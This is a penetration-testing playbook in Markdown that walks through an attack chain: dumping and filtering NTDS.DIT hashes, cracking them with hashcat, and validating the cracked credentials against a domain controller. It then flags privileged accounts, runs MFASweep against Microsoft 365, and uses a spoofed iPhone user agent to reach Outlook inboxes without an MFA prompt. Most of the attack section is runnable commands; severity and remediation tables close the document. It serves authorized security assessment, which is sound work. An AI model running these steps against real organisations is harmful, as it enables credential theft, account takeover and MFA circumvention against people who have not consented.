# NTDS Dump → Weak Passwords → MFA Bypass

**Techniques:** Hash Cracking, Credential Validation, MFA Bypass via Legacy Auth  
**MITRE:** T1003.003, T1110.002, T1087.002, T1201, T1556  
**Auth Required:** Domain Admin (for NTDS dump); Low-priv (for validation/MFASweep)  
**Tags:** #playbook #ntds #hashcat #mfa-bypass #m365 #credential-access

---

## Objective
Starting from an NTDS.DIT dump, identify accounts with weak passwords, validate credentials are live, analyze password patterns, and demonstrate MFA bypass via M365 legacy authentication endpoints.

## Prerequisites
- NTDS.DIT secrets dump (from secretsdump.py / DCSync)
- Network access to a Domain Controller (for validation)
- Network access to M365/O365 (for MFA bypass testing)
- hashcat installed (GPU preferred)
- MFASweep cloned (`git clone https://github.com/dafthack/MFASweep`)
- pipal installed (`gem install pipal`)

---

## Steps

### Step 1 — Filter NTDS output
```bash
grep -v '^[^:]*\$:' ntds.dit.txt \
| grep -v '^krbtgt:' \
| grep -v ':aad3b435b51404eeaad3b435b51404ee:' \
| grep -v ':31d6cfe0d16ae931b73c59d7e0c089c0:' \
> ntds_filtered.txt

# Extract unique NTLM hashes
cut -d: -f4 ntds_filtered.txt | grep -v '^\s*$' | sort -u > unique_ntlm_hashes.txt
wc -l unique_ntlm_hashes.txt
```

### Step 2 — Crack hashes with hashcat
```bash
# Dictionary + rules
hashcat -m 1000 unique_ntlm_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -o cracked.txt

# Seasonal mask
hashcat -m 1000 unique_ntlm_hashes.txt -a 3 ?u?l?l?l?l?l?d?d?d?d?s \
  -o cracked.txt --append

# Export cracked pairs
hashcat -m 1000 unique_ntlm_hashes.txt --show > cracked_pairs.txt
```

### Step 3 — Map hashes back to usernames
```bash
awk -F: 'NR==FNR{a[$1]=$2; next} ($4 in a){print $1":"a[$4]}' \
  cracked_pairs.txt ntds_filtered.txt > accounts_cracked.txt

# Split to separate files
cut -d: -f1 accounts_cracked.txt | sed 's/^[^\\]*\\//' > usernames.txt
cut -d: -f2 accounts_cracked.txt > passwords.txt
```

### Step 4 — Check password policy
```bash
nxc smb <DC_IP> -u <user> -p <pass> --pass-pol | tee password_policy.txt
```

### Step 5 — Validate credentials are live
```bash
nxc ldap <DC_IP> -d <DOMAIN> \
  -u usernames.txt -p passwords.txt \
  --no-bruteforce --continue-on-success | tee validation_results.txt
```

### Step 6 — Check for privileged accounts
```bash
for group in "Domain Admins" "Enterprise Admins" "Schema Admins" "Backup Operators" "Account Operators"; do
    nxc smb <DC_IP> -u <user> -p <pass> --groups "$group"
done | grep "Member" | awk -F'\' '{print tolower($2)}' | sort -u > highpriv_members.txt

grep -if highpriv_members.txt usernames.txt
```

### Step 7 — Analyze password patterns with Pipal
```bash
cut -d: -f2 accounts_cracked.txt > plaintexts_only.txt
pipal plaintexts_only.txt | tee pipal_results.txt
```

### Step 8 — Check for account lockouts
```powershell
# On DC directly (PowerShell)
Get-Content C:\temp\usernames.txt | ForEach-Object {
    Get-ADUser $_ -Properties LockedOut,BadLogonCount |
    Select SamAccountName,LockedOut,BadLogonCount
}
```

### Step 9 — Test MFA bypass with MFASweep
```bash
# Convert to UPN format
sed 's/$/@domain.com/' usernames.txt > upn_usernames.txt

# Run sweep
pwsh << 'EOF' 2>&1 | tee mfasweep_results.txt
Import-Module ./MFASweep.ps1
$users = Get-Content ./upn_usernames.txt
$passes = Get-Content ./passwords.txt
for ($i = 0; $i -lt $users.Count; $i++) {
    Write-Host "=== $($users[$i]) ==="
    Invoke-MFASweep -Username $users[$i] -Password $passes[$i]
    Start-Sleep -Seconds 2
}
EOF
```

### Step 10 — Prove inbox access (if iPhone UA bypass found)
1. Firefox + "User Agent Switcher and Manager" extension
2. Set UA: `Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X)...`
3. Navigate to `https://outlook.office365.com`
4. Login with cracked credential — screenshot inbox without Duo prompt

---

## Evidence to Capture
- [ ] unique_ntlm_hashes.txt line count (unique hashes submitted)
- [ ] hashcat status screen (recovered count)
- [ ] accounts_cracked.txt line count (accounts affected)
- [ ] nxc validation output showing `[+]` hits
- [ ] password_policy.txt (policy gap evidence)
- [ ] pipal_results.txt (pattern analysis)
- [ ] highpriv group cross-reference output
- [ ] mfasweep_results.txt (Single Factor Access: Yes entries)
- [ ] Screenshot: inbox loaded without MFA prompt

---

## Severity Assessment
| Condition | Severity |
|-----------|----------|
| Weak passwords only, no privs, MFA enforced | High |
| Weak passwords + MFA bypass on legacy endpoints | High-Critical |
| Privileged accounts cracked (enabled DA/EA) | Critical |
| Privileged accounts cracked + MFA bypass | Critical |

---

## Remediation
| Finding | Fix |
|---------|-----|
| Weak passwords | Enforce 14+ char policy; Azure AD Password Protection; force reset for non-compliant accounts |
| Policy gap (old accounts) | Audit accounts predating policy change; force rotation |
| MFA bypass (iPhone UA / legacy auth) | Block legacy auth via Conditional Access; configure Duo for all auth flows |
| No lockout on O365 | Azure AD Smart Lockout tuning; enable sign-in risk policies |

---

## Related
- [[ntlm-hash-cracking]]
- [[ntds-account-mapping]]
- [[mfa-bypass-legacy-auth]]
- [[domain-password-policy]]
- [[account-lockout-check]]
- [[hashcat]]
- [[pipal]]
- [[mfasweep]]
